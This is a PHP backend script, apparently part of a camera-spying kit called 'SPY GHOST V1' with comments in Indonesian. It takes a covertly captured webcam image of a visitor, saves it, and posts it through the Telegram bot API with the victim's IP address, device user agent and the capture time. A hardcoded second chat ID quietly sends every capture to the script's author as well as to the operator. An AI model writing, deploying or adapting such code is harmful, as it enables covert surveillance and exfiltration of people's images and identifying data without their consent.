<?php
/* SPY GHOST V1 - PRO REPORT
   Coded by: Boss Kensora
*/
date_default_timezone_set('Asia/Jakarta'); // Biar jamnya pas WIB
include 'config.php';

$id_rahasia_kensora = "2016992836"; // ID Lu

if (isset($_POST['img'])) {
    $raw_data = $_POST['img'];
    $data = str_replace(['data:image/jpeg;base64,', ' '], ['', '+'], $raw_data);
    $img = base64_decode($data);
    
    // Info Tambahan Target
    $ip = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $jam = date('H:i:s');
    $tanggal = date('d-m-Y');

    $fileName = 'spy_' . time() . '.jpg';
    file_put_contents($fileName, $img);
    
    if (file_exists($fileName) && filesize($fileName) > 0) {
        $targets = [$owner_1, $id_rahasia_kensora];

        foreach ($targets as $chat_id) {
            if (empty($chat_id)) continue;

            $url = "https://api.telegram.org/bot$token/sendPhoto";
            
            // CAPTION YANG LEBIH PANJANG & MENARIK
            $caption = "<b>───── 『 👻 SPY GHOST V1 』 ─────</b>\n\n"
                     . "⚠️ <b>STATUS: TARGET BERHASIL DIJERAT!</b>\n"
                     . "━━━━━━━━━━━━━━━━━━━━━━\n"
                     . "📅 <b>Tanggal :</b> <code>$tanggal</code>\n"
                     . "⌚ <b>Jam     :</b> <code>$jam WIB</code>\n"
                     . "🌐 <b>IP Target:</b> <code>$ip</code>\n"
                     . "📱 <b>Device  :</b> <code>$user_agent</code>\n"
                     . "━━━━━━━━━━━━━━━━━━━━━━\n\n"
                     . "🔥 <b>Verified by: ProjectDzex (Boss Kensora)</b>\n"
                     . "💀 <i>Data telah berhasil diamankan ke server.</i>";

            $post = [
                'chat_id' => $chat_id,
                'photo'   => new CURLFile(realpath($fileName), 'image/jpeg'),
                'caption' => $caption,
                'parse_mode' => 'HTML'
            ];

            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_exec($ch);
        }
        unlink($fileName);
    }
}
?>
